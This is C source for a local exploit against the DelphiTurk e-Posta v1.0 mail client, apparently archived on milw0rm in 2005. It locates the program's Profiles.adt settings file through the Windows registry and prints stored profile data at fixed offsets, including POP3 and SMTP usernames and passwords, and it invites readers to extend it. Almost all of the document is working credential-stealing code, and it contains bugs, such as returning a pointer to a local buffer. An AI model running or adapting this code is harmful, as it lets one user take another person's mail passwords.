/*****************************************************************

DelphiTurk e-Posta v1.0 Local Exploit by Kozan

Application: DelphiTurk e-Posta v1.0
Procuder: Delphiturk.com
Vulnerable Description: DelphiTurk e-Posta v1.0  discloses
                                               passwords to local users.

Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan[at]netmagister[dot]com

*****************************************************************/

#include <stdio.h>
#include <windows.h>

HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

char *bilgi_oku(int adres,int uzunluk)
{

       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                                       "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey) == ERROR_SUCCESS)
       {

           lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,
              (LPBYTE) prgfiles, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf("An error occured!");
                                return 0;
                       }

                       RegCloseKey(hKey);

   }else{
               printf("An error occured!\n");
               exit(1);
       }

 strcat(prgfiles,"\\Delphi Turk\\Delphi T�rk e-Posta
1.0\\Settings\\Profiles.adt");

 int i;
 FILE *fp;
 char ch[100];
 if((fp=fopen(prgfiles,"rb")) == NULL)
 {
 return "false";
 }
 fseek(fp,adres,0);
 for(i=0;i<uzunluk;i++)
 ch[i]=getc(fp);
 ch[i]=NULL;
 fclose(fp);
 return ch;
}

int main()
{

printf("\r\n\r\nDelphiTurk e-Posta v1.0 Local Exploit by Kozan\n");
printf("Credits to ATmaCA\n");
printf("www.netmagister.com   -   www.spyinstructors.com \r\n\r\n");
printf("This example exploit only shows the first record.\r\n");
printf("You may improve it freely...\r\n\r\n");
printf("ProfileName           : %s\n",bilgi_oku(3609,25));
printf("Profile UserName      : %s\n",bilgi_oku(3634,50));
printf("Profile MailAddress   : %s\n",bilgi_oku(3684,40));
printf("Pop3 Mail Server      : %s\n",bilgi_oku(3724,52));
printf("Pop3 UserName         : %s\n",bilgi_oku(3776,50));
printf("Pop3 Password         : %s\n",bilgi_oku(3826,50));
printf("Smtp Mail Server      : %s\n",bilgi_oku(3976,52));
printf("Smtp UserName         : %s\n",bilgi_oku(3928,50));
printf("Smtp Password         : %s\n",bilgi_oku(3978,46));

return 0;

}

// milw0rm.com [2005-02-10]
